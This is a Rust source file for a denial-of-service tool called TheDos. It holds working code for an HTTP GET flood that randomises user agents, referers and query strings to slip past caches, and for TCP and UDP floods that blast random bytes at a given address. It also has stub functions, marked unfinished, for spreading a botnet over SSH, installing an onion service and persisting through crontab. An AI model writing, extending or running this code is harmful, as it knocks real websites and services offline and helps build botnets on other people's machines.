


// -_-_-_-_-_-_-_
// ATTACK METHODS
// -_-_-_-_-_-_-_








use crate::*;













#[derive(Clone, Debug, Default)]
pub struct TheDos{
    pub flag: u8,
    pub safe: u8,
    pub retries: usize,
    pub status_code: u16,
    pub host: Option<String>,
    pub url: Option<String>,
    pub tcp_addr: Option<String>,
    pub udp_addr: Option<String>,
    pub n_workers: usize,
}


impl TheDos{


    pub fn new(url: Option<String>, tcp_addr: Option<String>, udp_addr: Option<String>, host: Option<String>, n_workers: usize) -> Self{
        Self{
            flag: 0,
            safe: 0,
            retries: 0,
            status_code: 0,
            host,
            url,
            tcp_addr,
            udp_addr,
            n_workers,
        }
    }

}


pub fn gen_chars(size: u32) -> String{
    let mut rng = rand::thread_rng();
    (0..size).map(|_|{
        char::from_u32(rng.gen_range(65..91)).unwrap() // generating a char from the random output of type u32 using from_u32() method
    }).collect()
}


pub fn gen_random_number(from: u32, to: u32) -> u32{
    let mut rng = rand::thread_rng(); // we can't share this between threads and across .awaits
    rng.gen_range(from..to)
} 



impl TheDos{


    pub fn spread(&self) -> Result<Self, utils::TheDosError>{
        
        let TheDos { 
            flag, 
            safe, 
            retries, 
            status_code, 
            host, 
            url, 
            tcp_addr, 
            udp_addr, 
            n_workers 
        } = self; // unpacking self into a new struct
        
        // ssh uploading to start botnet
        todo!()
    
    }

    pub fn install(&self) -> Result<Self, utils::TheDosError>{
        // build configs and run the onion 
        todo!()
    }

    pub fn persistence(&mut self) -> Result<Self, utils::TheDosError>{
        // crontab
        todo!()
    }

    pub fn build_user_agents(&self) -> Vec<&'static str>{ // use 'static lifetime in order to be able to return &str from the function since rust doesn't allow to return reference by default unless the return type has a valid and defined lifetime
        let mut user_agents = Vec::<&str>::new();
        user_agents.push("Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393");
        user_agents.push("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51");
        user_agents.push("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3");
        user_agents.push("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)");
        user_agents.push("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)");
        user_agents.push("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1");
        user_agents.push("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1");
        user_agents.push("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)");
        user_agents.push("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)");
        user_agents.push("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)");
        user_agents.push("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)");
        user_agents.push("Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)");
        user_agents.push("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)");
        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169");
        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120");
        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 ");
        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0");
        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582");
        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577");
        user_agents.push("Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6");
        user_agents.push("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200");
        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586");
        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");

        user_agents
    
    }

    
    pub fn headers_referers(&self) -> Vec<&str>{ // it's ok to return Vec<&str> since we're using the lifetime of the self
        let mut headers_referers = Vec::<&str>::new();
        headers_referers.push("http://snappfood.ir/");
        headers_referers.push("http://digikala.com/");
        headers_referers.push("http://arvancloud.com/");
        headers_referers.push(self.host.as_ref().unwrap().as_str());

        headers_referers

    }
    
    
    
    pub async fn send_get(&mut self) -> Result<Response<Body>, hyper::Error>{

        let param_joiner = if self.url.as_ref().unwrap().as_str().matches("&").count() > 0{ // can't move self.url since it's behind a mutable reference thus we have to either borrow it using as_ref() method or clone it
            "&"
        } else{
            "?"
        };
        
        let referer = format!("{}{}", self.headers_referers()[gen_random_number(0, self.headers_referers().len() as u32 ) as usize], gen_chars(gen_random_number(5, 11)));
        let uri = format!("{}{}{}={}", self.url.as_ref().unwrap().as_str(), param_joiner, gen_chars(gen_random_number(3, 11)), gen_chars(gen_random_number(3, 11))).as_str().parse::<Uri>().unwrap();
        let client = Client::new();
        let req = Request::builder()
                                            .uri(&uri)
                                            .method("GET")
                                            .header("User-Agent", self.build_user_agents()[gen_random_number(0, self.build_user_agents().len() as u32 ) as usize])
                                            .header("Cache-Control", "no-cache")
                                            .header("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
                                            .header("Referer", referer.as_str())
                                            .header("Keep-Alive", gen_random_number(110, 120))
                                            .header("Connection", "keep-alive")
                                            .header("Host", self.host.as_ref().unwrap().as_str())
                                            .body(Body::from(""))
                                            .expect("failed to build the request");

        // 1) For each attack:
        //     - Spawn a new httpcall()
        //     - That task starts making non-blocking I/O calls
        //     - Those tasks go to sleep, to be rescheduled when data is ready
        // 2) Reach the end of the main function, which triggers the runtime to shut down
        // don't use block_on() cause we'll face ConnectError("dns error"... The problem is that we reach (2) long before we finish (1). 
        // When this happens, all in-flight I/O will be cancelled, which leads to the error messages we saw above. Instead, 
        // we need to ensure we wait for each task to complete before we exit. 
        // The easiest way to do this is to call .await on the result of the tokio::spawn call since in concurrency 
        // we don't need to be sequential thus we must have joinhanle tasks: https://www.fpcomplete.com/blog/http-status-codes-async-rust/
        // let res = block_on(client.request(req)).unwrap(); 
        
        println!("sending GET of {} to {} at time {} | {} retries", uri, self.url.as_ref().unwrap(), chrono::Local::now(), self.retries);

        // first it'll create a hyper request process object during the loop and run the rest of the code without blocking 
        // then await on each of them asyncly to send those created request object to the target host  
        // finally it'll check the response comming back from the target for each result.
        self.retries+=1;
        client.request(req).await


    }


    
    /////////////////////////////////////////////////////////////////////////////////////
    //////////////////////////////// LAYER 7 HTTP ATTACK ////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////

    pub async fn httpcall(&mut self){ // url is &str thus we don't need to clone it since its sized
        
        
        let mut res = self.send_get().await;

        while let Err(e) = res{
            
            eprintln!("can't send to {} at {} due to {}", self.url.as_ref().unwrap(), chrono::Local::now(), e);
            println!("retring send get at {}", chrono::Local::now());
            res = self.send_get().await; // send the get untill all workers get finished
            
            if self.retries >= self.n_workers{
                println!("reached the maximum workers at {}", chrono::Local::now());
                process::exit(1); // reached the maximum workers
            }

        }
        
    
    }
    

    
    ////////////////////////////////////////////////////////////////////////////////////
    //////////////////////////////// LAYER 4 TCP ATTACK ////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////
    
    pub async fn tcpcall(&mut self){

        let mut time = self.retries;
        let workers = self.n_workers; // making a new lifetime for the workers
        let tcp_addr = self.tcp_addr.clone().unwrap(); // if we are here we are sure that we have a tcp address from the passed in cli arg - single ip:port attack

        time+=1;
        tokio::spawn(async move{ // we can't use self inside the tokio::spawn() body since self is a reference that is only valid in the associated function body 
            match TcpStream::connect(tcp_addr.clone().as_str()).await{
                Ok(mut stream) => {

                    println!("sending packet at {} | retries {}", chrono::Local::now(), time);
                    let random_bytes: Vec<u8> = (0..workers).map(|_| { rand::random::<u8>() }).collect(); // generating a random buffer with the number of workers as the byte size, for 4096 workers we'll have 4096 bytes
                    stream.write_all(&random_bytes).await.unwrap(); // sending buffer to the target host 

                },
                Err(e) => eprintln!(": {} at {}", e, chrono::Local::now()),
            }
        });  
        
        self.retries = time;
    
    }
    

    
    ////////////////////////////////////////////////////////////////////////////////////
    //////////////////////////////// LAYER 4 UDP ATTACK ////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////
    // since the UDP protocol doesn't have any capabilities to detect a broken connection 
    // the server needs to be run first, otherwise the client will block forever.
    
    pub async fn udpcall(&mut self){
            
        let mut time = self.retries;
        let workers = self.n_workers; // making a new lifetime for the workers
        let udp_addr = self.udp_addr.clone().unwrap(); // if we are here we are sure that we have a udp address from the passed in cli arg

        time+=1;
        tokio::spawn(async move{
            let socket = UdpSocket::bind("0.0.0.0:0").await.unwrap(); // binding to any available address and any port selected by the os for outbound packets
            match socket.connect(udp_addr.clone().as_str()).await{
                Ok(_) => {

                    println!("sending packet at {} | retries {}", chrono::Local::now(), time);
                    let random_bytes: Vec<u8> = (0..workers).map(|_| { rand::random::<u8>() }).collect(); // generating a random buffer with the number of workers as the byte size, for 4096 workers we'll have 4096 bytes
                    socket.send(&random_bytes).await.unwrap(); // send to the remote address that this socket is connected to or we can send to another address 

                },
                Err(e) => eprintln!(": {} at {}", e, chrono::Local::now()),
            }
        });
             
        self.retries = time;

    }

}